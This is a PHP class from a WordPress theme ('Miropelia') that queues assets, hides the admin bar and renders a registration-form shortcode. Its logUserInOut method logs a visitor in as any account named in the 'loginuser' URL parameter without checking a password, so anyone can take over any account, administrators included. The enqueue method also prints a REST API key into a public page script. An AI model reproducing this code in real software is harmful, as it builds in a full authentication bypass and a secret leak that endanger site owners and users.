<?php
/**
 * Register
 *
 * @package Miropelia
 */

namespace Miropelia;

/**
 * Register Class
 *
 * @package Miropelia
 */
class Register {

	/**
	 * Theme instance.
	 *
	 * @var object
	 */
	public $theme;

	/**
	 * Class constructor.
	 *
	 * @param object $plugin Plugin class.
	 */
	public function __construct( $theme ) {
		$this->theme = $theme;
	}

	/**
	 * Enqueue Assets for front ui.
	 *
	 * @action wp_enqueue_scripts
	 */
	public function enqueue_assets() {
		global $post;

		wp_enqueue_style($this->theme->assets_prefix);
        wp_enqueue_script($this->theme->assets_prefix);
        wp_enqueue_style("{$this->theme->assets_prefix}-font", 'https://fonts.googleapis.com/css2?family=Roboto+Slab:wght@300;400;600&display=swap');

        if (is_page('register')) {
            wp_add_inline_script($this->theme->assets_prefix, 'const restApiKey ="' . REST_API_KEY . '";');
        }

        if (is_page('contact')) {
            wp_enqueue_script('google-recaptcha');
        }

        // Hide all elements with hide-on-login class if user is logged in.
        if (is_user_logged_in()) {
            wp_add_inline_style($this->theme->assets_prefix, '.hide-on-login{ display: none; }');
        }
	}

	/**
     * Hide admin bar for non-admins and keep users out of admin.
     *
     * @action init
     */
	public function hideAdminBar() {
        if (!current_user_can('administrator') && !is_admin()) {
            show_admin_bar(false);
        }

        if ( is_admin() && !current_user_can('administrator') &&
             ! ( defined( 'DOING_AJAX' ) && DOING_AJAX ) ) {
            wp_redirect( home_url() );
            exit;
        }
    }

    /**
     * Auto log user in or out.
     *
     * @action init
     */
    public function logUserInOut() {
        if (!isset($_GET['logoutuser']) && !isset($_GET['loginuser'])) {
            return;
        }

        $user = get_user_by('login', $_GET['loginuser']);

        // If no error received, set the WP Cookie
        if ( !is_wp_error( $user ) )
        {
            wp_clear_auth_cookie();
            wp_set_current_user ( $user->ID ); // Set the current user detail
            wp_set_auth_cookie  ( $user->ID ); // Set auth details in cookie
        }

        if (isset($_GET['logoutuser'])) {
            wp_logout();
            wp_safe_redirect('/');
        }
    }

    /**
     * Dequeue recaptcha.
     *
     * @action wp_enqueue_scripts 999
     * @action wp_head 999
     */
    public function dequeueGoogle() {
        wp_dequeue_script('google-recaptcha');
    }

    /**
     * Register form shortcode.
     *
     * @shortcode register-form
     */
    public function registerForm() {
        return '<div class="form-wrapper">
                <error class="error-message"></error>
			    <p>
				    <label for="user_login">Username</label>
				    <input type="text" name="user_name" id="user_name" placeholder="Enter Username..." class="input" value="" size="20" autocapitalize="off">
			    </p>
		        <p>
		            <label for="user_login">Email</label>
		            <input type="text" name="user_email" id="user_email" placeholder="Enter Email..." class="input" value="" size="20" autocapitalize="off">
		        </p>
		        <p>
		            <label for="user_email">Password</label>
		            <input type="password" name="user_password" id="user_password" placeholder="Enter Password..." class="input" value="" size="25">
		        </p>
		        <p class="submit">
		            <button type="button" id="register-submit">' . esc_html('Join') . '</button>
		        </p>
		    </div>';
    }
}
